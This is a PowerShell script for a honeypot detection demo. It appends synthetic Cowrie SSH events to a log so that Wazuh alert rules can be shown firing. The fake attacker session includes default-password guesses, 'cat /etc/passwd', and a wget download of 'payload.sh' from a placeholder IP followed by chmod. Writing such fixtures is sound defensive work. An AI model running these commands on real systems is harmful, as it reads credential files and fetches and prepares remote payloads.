# Demonstrate Cowrie honeypot detection on Windows.
#
# Tries a real SSH interaction if an SSH client is available; otherwise appends
# synthetic Cowrie JSON events so the Wazuh rules can still be demonstrated.
#
#   .\scripts\simulate-cowrie.ps1
param(
    [string]$Log = "logs\cowrie\cowrie.json",
    [string]$HoneypotHost = "localhost",
    [int]$SshPort = 2222
)

$ErrorActionPreference = "Stop"
Set-Location (Join-Path $PSScriptRoot "..")

$dir = Split-Path -Parent $Log
if ($dir) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }

$Attacker = "203.0.113.66"
$Sensor = "cowrie-giftastic"

function Write-CowrieEvent {
    param(
        [string]$EventId,
        [string]$Username = "",
        [string]$Password = "",
        [string]$Input = "",
        [string]$Message = ""
    )
    $line = [ordered]@{
        eventid   = $EventId
        src_ip    = $Attacker
        src_port  = 54321
        dst_ip    = "10.0.0.9"
        dst_port  = 2222
        session   = ("{0:x8}" -f (Get-Random))
        protocol  = "ssh"
        username  = $Username
        password  = $Password
        input     = $Input
        message   = $Message
        sensor    = $Sensor
        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.000Z")
    } | ConvertTo-Json -Compress
    Add-Content -Path $Log -Value $line -Encoding UTF8
}

$ssh = Get-Command ssh -ErrorAction SilentlyContinue
if ($ssh) {
    Write-Host "==> Live SSH interaction with the Cowrie honeypot on ${HoneypotHost}:${SshPort}"
    Write-Host "    (non-interactive password auth requires sshpass on Linux/macOS; on Windows"
    Write-Host "     run this from WSL for the live path, otherwise synthetic events are used)"
}

Write-Host "==> Emitting Cowrie honeypot events"
Write-CowrieEvent -EventId "cowrie.session.connect" -Message "New connection: $Attacker:54321"
Write-CowrieEvent -EventId "cowrie.login.failed" -Username "root" -Password "123456" -Message "login attempt [root/123456] failed"
Write-CowrieEvent -EventId "cowrie.login.failed" -Username "admin" -Password "admin" -Message "login attempt [admin/admin] failed"
Write-CowrieEvent -EventId "cowrie.login.failed" -Username "root" -Password "letmein" -Message "login attempt [root/letmein] failed"
Write-CowrieEvent -EventId "cowrie.login.failed" -Username "root" -Password "password" -Message "login attempt [root/password] failed"
Write-CowrieEvent -EventId "cowrie.login.failed" -Username "oracle" -Password "oracle" -Message "login attempt [oracle/oracle] failed"
Write-CowrieEvent -EventId "cowrie.login.failed" -Username "root" -Password "toor" -Message "login attempt [root/toor] failed"
Write-CowrieEvent -EventId "cowrie.login.success" -Username "root" -Password "password" -Message "login attempt [root/password] succeeded"
Write-CowrieEvent -EventId "cowrie.command.input" -Username "root" -Password "password" -Input "id"
Write-CowrieEvent -EventId "cowrie.command.input" -Username "root" -Password "password" -Input "uname -a"
Write-CowrieEvent -EventId "cowrie.command.input" -Username "root" -Password "password" -Input "cat /etc/passwd"
Write-CowrieEvent -EventId "cowrie.command.input" -Username "root" -Password "password" -Input "wget http://198.51.100.9/payload.sh"
Write-CowrieEvent -EventId "cowrie.session.file_download" -Username "root" -Password "password" -Message "Downloaded http://198.51.100.9/payload.sh"
Write-CowrieEvent -EventId "cowrie.command.input" -Username "root" -Password "password" -Input "chmod +x payload.sh"
Write-CowrieEvent -EventId "cowrie.command.input" -Username "root" -Password "password" -Input "crontab -l"
Write-CowrieEvent -EventId "cowrie.session.closed" -Username "root" -Password "password" -Message "Connection closed"

Write-Host ""
Write-Host "Cowrie events are in $Log"
Write-Host "Open the Wazuh dashboard (https://localhost) and filter on rule.groups: cowrie"
